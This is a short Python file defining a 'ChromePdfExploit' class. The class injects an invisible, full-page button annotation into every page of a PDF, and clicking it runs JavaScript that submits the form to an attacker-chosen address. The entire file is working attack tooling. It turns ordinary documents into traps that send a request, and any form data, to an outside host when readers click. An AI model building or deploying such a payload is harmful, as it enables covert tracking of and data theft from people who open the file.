from core import *
from core.imp import *


class ChromePdfExploit():
    def __init__(self, target_addr: str) -> None:
        self.target_addr = target_addr
        pass

    def _make_action(self) -> DictionaryObject:
        action = DictionaryObject({
            NameObject("/S"): NameObject("/JavaScript"),
            NameObject("/JS"): TextStringObject(f"""
var u = "{self.target_addr}";
this.submitForm(u);
                                                """),
        })
        return action

    def _make_annot(self, rect: RectangleObject, action: IndirectObject) -> DictionaryObject:
        annot = DictionaryObject({
            NameObject("/Type"): NameObject("/Annot"),
            NameObject("/Subtype"): NameObject("/Widget"),
            NameObject("/Rect"): rect,
            NameObject("/ca"): NumberObject(0),  # 透明度？

            NameObject("/A"): action,

            NameObject("/H"): NameObject("N"),  # 高亮模式, N: No highlighting
            NameObject("/FT"): NameObject("/Btn"),
            NameObject("/T"): TextStringObject("pagebtn"),

            # field flags
            NameObject("/Ff"): NumberObject(0b10000000000000000),
        })
        return annot

    def exploit(self, pdf: Pdf):
        action = self._make_action()

        for p in pdf.pages:
            arct = p.artbox
            if not isinstance(arct, RectangleObject):
                arct = p.mediabox
            if not isinstance(arct, RectangleObject):
                arct = p.bleedbox
            print(f"{p.page_number} use arct: {arct}")
            annot = self._make_annot(arct, pdf.add_object(action))
            pdf.add_annotation(p, annot)
